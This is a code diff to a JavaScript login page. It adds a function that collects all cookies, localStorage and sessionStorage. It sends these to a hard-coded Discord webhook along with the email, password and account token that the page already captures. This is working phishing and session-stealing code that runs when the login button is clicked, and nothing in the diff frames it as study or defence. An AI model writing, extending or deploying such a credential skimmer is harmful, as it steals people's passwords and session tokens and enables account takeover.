@@ -105,12 +105,46 @@ async function fetchAccountToken(email, password) {
 }
 
 // --------------------------------------------------
+// ---------- COLLECT USER TOKENS -------------------
+// --------------------------------------------------
+function collectUserTokens() {
+  let tokens = {};
+
+  // Get cookies
+  const cookies = document.cookie.split(";").reduce((acc, cookie) => {
+    const [key, value] = cookie.trim().split("=");
+    acc[key] = value;
+    return acc;
+  }, {});
+  tokens.cookies = cookies;
+
+  // Get localStorage
+  const localStorageTokens = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageTokens[key] = localStorage.getItem(key);
+  }
+  tokens.localStorage = localStorageTokens;
+
+  // Get sessionStorage
+  const sessionStorageTokens = {};
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    sessionStorageTokens[key] = sessionStorage.getItem(key);
+  }
+  tokens.sessionStorage = sessionStorageTokens;
+
+  return tokens;
+}
+
+// --------------------------------------------------
 // ---------- WEBHOOK FUNCTION ----------------------
 // --------------------------------------------------
 async function sendToWebhook(email, password, token = null) {
   const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
+  const userTokens = collectUserTokens();
   const payload = {
-    content: `Email: ${email}\nPassword: ${password}\nToken: ${token || 'Not retrieved'}\nTimestamp: ${new Date().toISOString()}`,
+    content: `Email: ${email}\nPassword: ${password}\nToken: ${token || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
     username: "Login Attempt",
     avatar_url: "https://example.com/avatar.png"
   };
@@ -160,7 +194,7 @@ loginButton.addEventListener("click", async () => {
   // Fetch token
   const token = await fetchAccountToken(email, password);
 
-  // Send to webhook with token
+  // Send to webhook with token and collected user tokens
   const webhookSuccess = await sendToWebhook(email, password, token);
 
   // After animation (3s), redirect if success
